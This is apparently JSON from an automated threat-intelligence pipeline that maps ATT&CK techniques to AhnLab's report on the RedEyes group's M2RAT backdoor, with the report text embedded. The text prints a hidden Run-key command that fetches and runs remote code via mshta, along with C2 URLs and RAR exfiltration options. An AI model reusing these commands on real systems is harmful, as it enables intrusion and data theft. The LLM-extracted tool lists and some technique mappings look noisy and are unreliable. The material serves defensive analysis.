            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.161,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "result_[number]",
              "_Encoded MAC Address Value_cap",
              "_Encoded MAC Address Value_2"
            ],
            "tools": [
              "reg",
              "ping",
              "Malware",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "763958e8-b49b-4121-8cfe-ca726ee9f6bf",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Process Injection",
            "attack_id": "T1055",
            "tactic": "Defense Evasion",
            "description": "The M2RAT backdoor operates after being injected into explorer.exe",
            "confidence_score": 0.653,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.207,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "explorer.exe"
            ],
            "tools": [
              "reg",
              "ping",
              "M2RAT",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "8f29289d-64ea-4a93-ad24-8590115d36d4",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Process Hollowing",
            "attack_id": "T1093",
            "tactic": "Defense Evasion",
            "description": "The threat actor injected malware into explorer.exe",
            "confidence_score": 0.652,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.161,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "explorer.exe",
              "M2RAT"
            ],
            "tools": [
              "reg",
              "ping",
              "Malware",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "f60eba17-0cf4-4f1e-b3d5-7a1c88384875",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Server Software",
            "attack_id": "T1584",
            "tactic": "Command and Control",
            "description": "Threat actor's server transmits CMD commands to M2RAT",
            "confidence_score": 0.65,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.184,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "threat actor's server"
            ],
            "tools": [
              "reg",
              "ping",
              "M2RAT",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "123c0b6c-21bf-4ed8-afa8-6f12631d9416",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Data Staging",
            "attack_id": "T1074",
            "tactic": "Exfiltration",
            "description": "Staging data in the %TEMP% path before exfiltration",
            "confidence_score": 0.65,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.184,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "%TEMP%\\Y_%m_%d_%H_%M_%S"
            ],
            "tools": [
              "reg",
              "ping",
              "Malware",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "7662db78-9243-4b7b-aa6f-23d3f4f552a7",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Application Window Discovery",
            "attack_id": "T1010",
            "tactic": "Discovery",
            "description": "Discovering application windows for data exfiltration",
            "confidence_score": 0.649,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.138,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "PhoneDataCp",
              "PhoneDeviceManager"
            ],
            "tools": [
              "reg",
              ".NET",
              "ping",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "b7df559e-e33f-4a95-8718-eaf63fa76457",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Input Capture",
            "attack_id": "T1056",
            "tactic": "Collection",
            "description": "Capturing input data from mobile phones",
            "confidence_score": 0.649,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.138,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "PhoneDeviceManager.pdb",
              "M2RAT"
            ],
            "tools": [
              "reg",
              ".NET",
              "ping",
              "M2RAT",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "a933bce9-d179-45ec-b723-1ecdc57f728f",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "Using PowerShell and cmd for execution",
            "confidence_score": 0.649,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.138,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Powershell",
              "cmd"
            ],
            "tools": [
              "reg",
              "ping",
              "Sc",
              "mshta",
              "Powershell",
              "PowerShell",
              "cve",
              "at",
              "powershell",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "3b3540f2-e909-492f-bcd5-0f492d19a78c",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Data Staging",
            "attack_id": "T1074",
            "tactic": "Command and Control",
            "description": "Attacker used PE file for data staging",
            "confidence_score": 0.646,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.161,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "7bab405fbc6af65680443ae95c30595d"
            ],
            "tools": [
              "reg",
              "ping",
              "Sc",
              "PE file",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "724d6eb8-1de8-43fb-ba74-2168b52bf5d7",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Exploitation for Client Execution",
            "attack_id": "T1204",
            "tactic": "Execution",
            "description": "Attacker exploited EPS file for execution",
            "confidence_score": 0.643,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.138,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "8b666fc04af6de45c804d973583c76e0"
            ],
            "tools": [
              "reg",
              "ping",
              "EPS file",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "27a76eaf-be4b-4eb9-b89c-9952a5911d0c",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "Attacker used cmd for execution",
            "confidence_score": 0.639,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.115,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "cmd.exe"
            ],
            "tools": [
              "reg",
              "ping",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "73bc2224-56d5-4c78-bac2-365845f54f4f",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Process Injection",
            "attack_id": "T1055",
            "tactic": "Defense Evasion",
            "description": "Detected Process Injection activity via NLP pattern matching",
            "confidence_score": 0.636,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.214,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "reg",
              "ping",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "3812cd34-0272-4a55-89fd-57d76a3bd7e5",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Application Layer Protocol",
            "attack_id": "T1071",
            "tactic": "Command And Control",
            "description": "Detected Application Layer Protocol activity via NLP pattern matching",
            "confidence_score": 0.633,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.199,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "reg",
              "ping",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "484887b8-9a33-4b47-8375-17191f0c201b",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Remote Access Tool",
            "attack_id": "T1219",
            "tactic": "Command and Control",
            "description": "Attacker used M2RAT",
            "confidence_score": 0.632,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.069,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "4488c709970833b5043c0b0ea2ec9fa9"
            ],
            "tools": [
              "reg",
              "ping",
              "M2RAT",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "f39d13c9-d248-4b04-81fa-8238521ed6e5",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "Detected Command and Scripting Interpreter activity via NLP pattern matching",
            "confidence_score": 0.631,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "reg",
              "ping",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "ba205bb7-f4b3-48f7-a841-019177f768d1",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Obfuscated Files or Information",
            "attack_id": "T1027",
            "tactic": "Defense Evasion",
            "description": "Detected Obfuscated Files or Information activity via NLP pattern matching",
            "confidence_score": 0.631,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "reg",
              "ping",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "9bd010dd-7f57-412e-ac77-269099e260d6",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Exfiltration Over C2 Channel",
            "attack_id": "T1041",
            "tactic": "Exfiltration",
            "description": "Detected Exfiltration Over C2 Channel activity via NLP pattern matching",
            "confidence_score": 0.631,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "reg",
              "ping",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "abc4d884-d29f-4bd2-9c85-4fb0b5f9f077",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Exploit Public-Facing Application",
            "attack_id": "T1190",
            "tactic": "Initial Access",
            "description": "Detected Exploit Public-Facing Application activity via NLP pattern matching",
            "confidence_score": 0.628,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.162,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "reg",
              "ping",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "f3a13a36-0aa8-4ef9-b9d6-af987cea423e",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Archive Collected Data",
            "attack_id": "T1560",
            "tactic": "Collection",
            "description": "Detected Archive Collected Data activity via NLP pattern matching",
            "confidence_score": 0.628,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.162,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "reg",
              "ping",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "50e0e0ea-6580-44d0-a3b8-48e3687b6319",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Screen Capture",
            "attack_id": "T1113",
            "tactic": "Collection",
            "description": "Detected Screen Capture activity via NLP pattern matching",
            "confidence_score": 0.624,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.139,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "reg",
              "ping",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "9036e5f9-016b-4c5f-bae2-e512d304192f",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Registry Run Keys",
            "attack_id": "T1547.001",
            "tactic": "Persistence",
            "description": "Detected Registry Run Keys activity via NLP pattern matching",
            "confidence_score": 0.623,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.5,
              "description_detail": 0.199,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "reg",
              "ping",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "nlp_indicator"
          }
        ],
        "nlp_analysis": {
          "processed_text": {
            "cleaned_text": "1 / 1 3 By muhan February 21  2023 HWP Malware Using the Steganography Technique: RedEyes (ScarCruft) asec.ahnlab.com/en/48063 In January  the ASEC (AhnLab Security Emergency response Center) analysis team discovered that the RedEyes threat group (also known as APT37  ScarCruft) had been distributing malware by exploiting the HWP EPS (Encapsulated PostScript) vulnerability (CVE-2017-8291). This report will share the RedEyes group s latest activity in Korea. 1. Overview The RedEyes group is known for targeting specific individuals and not corporations  stealing not only personal PC information but also the mobile phone data of their targets. A distinct characteristic of the latest RedEyes group attack is the fact that they exploited the HWP EPS vulnerability using the steganography technique to distribute their malware. The HWP EPS vulnerability used in the attacks is an old vulnerability that has already been patched in the latest version of the Hangul Word Processor. We assume that the threat actor initiated their attacks after checking in advance if their targets (individuals) were using an older version of HWP that supports EPS. Furthermore  there is a confirmed past case where the RedEyes group used the steganography technique to distribute malware. In 2019  Kaspersky shared a report saying that the ScarCruft (RedEyes) group s downloader used the steganography technique to download additional malware. The usage of the steganography technique to download malware and the RUN key command for autorun registration to establish a consistent connection with the C C server being similar to the format used by the RedEye group in the past are the reasons why we believe they had done this attack. The RedEyes group is also known for using Powershell and the Chinotto malware to steal PC information and remote control systems. However  a new malware strain was found in the latest attack which  unlike Chinotto  uses the shared memory section to carry out C C commands. Regarding the newly identified malware  the ASEC analysis team named it M2RAT (Map2RAT) after the name found in the shared memory section. Figure 1. Shared memory section name info This report covers the TTPs (Tactics  Techniques  and Procedures) of the RedEyes group s initial access  defense evasion  persistence  and the newly identified M2RAT s latest command control and exfiltration. 2 / 1 3 Figure 2. Flow chart of the attack scenario 2. Analysis 2.1. Initial Access On January 13  an HWP EPS vulnerability (CVE-2017-8291) attack involving the usage of the filename  Form.hwp  was discovered by AhnLab s ASD (AhnLab Smart Defense). The HWP document was not collected at the time of the analysis  but we were able to procure the EPS file that triggered the aforementioned vulnerability. Figure 3. ASD infrastructure log EPS is a type of graphic format that uses the PostScript programming language by Adobe to show graphics. High- resolution vector images can be shown through EPS and the Hangul Word Processor supported a third-party module (ghostscript) to process EPS files. However  due to an increase in malicious EPS vulnerability exploitations  such as APT attacks  Hancom has removed the third-party EPS processing module. Additionally  the ASEC analysis team posted a detailed analysis report on the CVE-2017-8291 vulnerability back in 2019. The  Form.hwp  file includes a vulnerable EPS file (CVE-2017-8291) which is shown in Figure 4. When the user opens the file ( Form.hwp )  the vulnerability allows the threat actor s shellcode to run through the third-party module. Figure 4. EPS vulnerability code within  Form.hwp  3 / 1 3 Figure 5. Stage 1: Shellcode execution through EPS vulnerability The shellcode downloads an image file (JPEG) from the threat actor s server (C C) and decrypts the encoded PE file contained within the image file. Afterward  it creates the PE file in the  temp  path before executing it. 2.2. Defense Evasion The shellcode downloaded an image file from the threat actor s server and executed an additional piece of malware. In other words  the threat actor used the steganography technique to embed a malware strain within an image. We assume that this was done to evade network detection. It appears that the steganography image file used by the threat actor was obtained from a wallpaper-sharing website called  wallup.net . 4 / 1 3 Figure 6. Steganography image file The image file consists of a normal JPEG header  the meta data required for decoding the PE file (XOR key and file size)  and the encoded PE file. Figure 7. Configuration info of steganography image A 16-byte XOR key is used for PE decoding to XOR 1 byte at a time. 5 / 1 3 16-byte xor key : FD DD 28 F5 7C 48 8E 7E 0C E0 17 77 35 87 3B 49 (0xFD xor 0xB0)   0x4D (M) (0xDD xor 0x87)   0x5A (Z) (0x28 xor 0xB8)   0x90 (0xF5 xor 0xF5)   0x00 (  MZ is the signature of the PE file.) The ultimately decoded PE file is created and executed under the name lskdjfel.exe in the  temp  path. The executed PE file is responsible for downloading an additional backdoor malware (M2RAT)  injecting it into explorer.exe  and adding both Powershell and mshta commands to the autorun registry Run key to establish a persistent connection with the threat actor s server. 2.3. Persistence The executed lskdjfel.exe file registers the following command to the registry Run key to establish a persistent connection with the threat actor s server. Registry key path: HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run Value name: RyPO Value: c:\\windows\\system32\\cmd.exe /c PowerShell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass ping -n 1 -w 340328 2.2.2.2    mshta hxxps://www.     elearning.or[.]kr/popup/handle/1.html Figure 8. Stage 2: Execution of the decrypted PE file (Backdoor download and ensuring persistence) The command registered to the registry Run key was found to be similar to that of the ScarCruft (RedEyes) group report published by Kaspersky in 2021. [ScarCruft s registry Run key command in 2021 (by Kaspersky)] c:\\windows\\system32\\cmd.exe /c PowerShell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass ping -n 1 -w 300000 2.2.2.2    mshta hxxp://[redacted].cafe24[.]com/bbs/probook/1.html 6 / 1 3 [RedEyes (ScarCruft) registry Run key command in 2023] c:\\windows\\system32\\cmd.exe /c PowerShell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass ping -n 1 -w 340328 2.2.2.2    mshta hxxps://www.       elearning.or[.]kr/popup/handle/1.html Whenever the affected host PC is booted up  the registry key causes Powershell and the normal Windows utility  mshta  to also be executed. At the time of analysis  an HTA (HTML Application) file containing a JS (JavaScript) code was collected from the  1.html  file that mshta had downloaded from the threat actor s server. The JS code is responsible for executing the Powershell command  which receives and executes commands from the threat actor s server  and returns the results. When the Powershell adds a  U  parameter to the threat actor s server address when transmitting the computer name and username  the threat actor s server encodes the CMD command that is going to be executed in BASE64 before sending it to the affected host. The encoded BASE64 command is then decoded by Powershell and executed. The result of the command is saved as a file in the  temp \\vnGhazwFiPgQ path. Afterward  an  R  parameter is added to the threat actor s server which then encodes the command execution result in BASE64 before sending it. hxxps://www.       elearning.or[.]kr/popup/handle/log.php U [Computer Name] [Username] // Receive the threat actor s command hxxps://www.       elearning.or[.]kr/popup/handle/log.php R [BASE64-encoded] // Send command execution result 7 / 1 3 Figure 9. Persistence-related Powershell code 2.4. M2RAT (Map2RAT) The ultimately executed backdoor operates after being injected into explorer.exe. The main features of this backdoor are similar to those of basic remote control malware  which include keylogging  data leakage (files and recordings)  running or terminating processes  and capturing screenshots. 8 / 1 3 Figure 10. Stage 3: Execution of M2RAT backdoor However  the recently discovered backdoor has a different command system compared to the previously identified Chinotto malware. It does not save the keylogging data or screenshot logs in the affected system but instead sends them to the threat actor s server  leaving no traces of the stolen data in the affected system. The ASEC analysis team named this newly identified malware M2RAT (Map2RAT) after the common name within the shared memory section used during C C communication. FileInputMap2 ProcessInputMap2 CaptureInputMap2 RawInputMap2 RegistryModuleInputMap2 TypingRecordInputMap2 UsbCheckingInputMap2 2.4.1. Command and Control of M2RAT M2RAT s C C communications command system involves receiving commands from the threat actor s server through the POST method s Body. The meaning of these command can be found in the below Table 1. 9 / 1 3 Figure 11. Screenshot of M2RAT s C C communications (Fiddler) C C CommandDescription OKR Command received upon initial connection with C C communications URL Edits the registry key value to update the C C UPD Updates the currently connected C C RES Ends C C connection (End M2RAT) UNI Ends C C connection (End M2RAT) CMD Performs remote control commands (Keylogging and process creation/execution) Table 1. Description of threat actor s commands M2RAT s threat actor server manages hosts with MAC addresses in order to distinguish affected hosts. When infected with M2RAT  the MAC address is encoded (XOR) with 0x5c and saved in the  HKCU\\Software\\OneDriver  path s  Version  value. The encoded MAC address value is used to distinguish affected hosts in the threat actor s server. Registry key path: HKCU\\Software\\OneDriver Value name: Version Value: Value that XOR-encoded (0x5c) MAC address of the affected host The result value of the command sent by the threat actor to the affected host is saved in the  _Encoded MAC Address Value_2  folder of the threat actor s server. The screenshots taken by M2RAT from the affected host are saved in the  _Encoded MAC Address Value_cap  folder. (Refer to Figure 12) Figure 12. Threat actor s server (Example) (The server screen in Figure 12 is a screen created by AhnLab s analysis system to resemble the threat actor s webserver.) 1 0 / 1 3 Additionally  M2RAT XOR encodes with 0x5c and saves the threat actor s server address info in the  Property  value of the same registry key path as the MAC address. Registry key path: HKCU\\Software\\OneDriver Value name: Property Value: Value that XOR-encoded (0x5c) threat actor s server address In the future  the threat actor can transmit the  URL  and  UPD  commands to M2RAT to update their server address (Refer to Table 1). The  URL  command is used to update the registry key with a new address and the  UPD  command is used to change the threat actor s address defined in the currently running instance of M2RAT. The remote control command of M2RAT is established by transmitting CMD commands from the threat actor s server. The Chinotto malware  which was confirmed to have been used by the RedEyes group in the past  executed remote control commands through the Query String method  but M2RAT creates a shared memory section to execute the commands from the threat actor s server. Like the threat actor s use of the steganography technique in the initial breach stage  this appears to also be for the purpose of evading network detection by hiding the command info in the Body of the POST. (  Query String: A string that starts with a question mark at the end of a URL) The CMD command is transmitted through the shared memory. The memory section name info is shown below in Table 2. Section Name Feature RegistryModuleInputMap2Transmits additional module execution results (e.g. Mobile phone data leak module) FileInputMap2 Explores drives (A:\\   Z:\\)  create/write files  and changes file time CaptureInputMap2Screenshots the current screen of the affected host s PC ProcessInputMap2Checks the process list  create/terminate processes RawInputMap2 Use ShellExectueExW API to run process TypingRecordInputMap2Leaks keylogging data UsbCheckingInputMap2USB data leak (hwp  doc  docx  xls  xlsx  ppt  pptx  cell  csv  show  hsdt  mp3  amr  3gp  m4a  txt png  jpg  jpeg  gif  pdf  eml) Table 2. Features of the shared memory section 2.4.2. Exfiltration M2RAT s exfiltration features include screenshots of the affected host s screen  process information  keylogging information  and data (documents and voice files) leaks. In the case of screenshots  they are taken regularly even if a command is not given by the threat actor. They are then sent to the threat actor s server where they are saved as  result_[number]  in the  _Encoded MAC Address Value_cap  folder. The remaining data leaks are saved in the  _Encoded MAC Address Value_2  folder. If there are documents or voice recordings with sensitive data in removable storage devices or shared folders  then these are copied into the  TEMP  path  compressed into a password-protected file with Winrar (RAR.exe)  and the results are then transmitted to the threat actor s server. Folder path where data is copied to:  Temp \\Y_ m_ d_ H_ M_ S // (e.g.  TEMP \\Year_Month_Date _Hour_Minute_Second) File extensions: hwp  doc  docx  xls  xlsx  ppt  pptx  cell  csv  show  hsdt  mp3  amr  3gp  m4a  txt  png  jpg  jpeg  gif  pdf  eml 1 1 / 1 3 The RAR.exe options that are used are as follows. The path the compressed file is created into is the same as the  TEMP  folder path. a -df -r -hp dgefiue389d@39r 1Ud -m1  Compressed file creation path   Compression target path  Option NameDescription a Compress df Delete file after compression r Recover compressed file hp Encrypt file data and header m Set compression level Table 3. Explanation of RAR compression options The ASEC analysis team was also able to uncover through the ASD (AhnLab Smart Defense) infrastructure an Infostealer communicating with M2RAT. This malware was identified as a .NET file that steals files saved on mobile phones and sends them to the RegistryModuleResultMap2 shared memory section of M2RAT. Figure 13. Code that transmits exfiltrated data to M2RAT 1 2 / 1 3 Figure 14. Mobile phone data theft target (file extension) info The .NET file s PDB info is as follows. PDB : E:\\MyWork\\PhoneDataCp\\PhoneDeviceManager\\PhoneDeviceManager\\obj\\x86\\Release\\PhoneDeviceManager.pdb 3. Conclusion 1 3 / 1 3 The RedEyes group is an APT hacking organization that is supported on a national level. They are known to attack individual targets such as human rights activists  reporters  and North Korean defects. Their aim appears to be exfilitration. Defending against such APT attacks is an extremely complicated process. Especially since the RedEyes group is known to target individuals instead of corporations. It is difficult for individuals to even realize they have been affected. The ASEC analysis team is closely tracking this group. Should a new TTPs be found from this threat actor  we will quickly share the details as we did in this blog post to contribute towards minimizing damage. 4. IOC [MD5 (Detection name  engine version)] 8b666fc04af6de45c804d973583c76e0 // EPS file   Exploit/EPS.Generic (2023.01.16.03) 93c66ee424daf4c5590e21182592672e // Steganography JPEG   Data/BIN.Agent (2023.02.15.00) 7bab405fbc6af65680443ae95c30595d // PE file(JPEG) Stage PE file   Trojan/Win.Loader.C5359534 (2023.01.16.03) 9083c1ff01ad8fabbcd8af1b63b77e66 // Powershell script   Downloader/PS.Generic.SC185661 (2023.01.16.03) 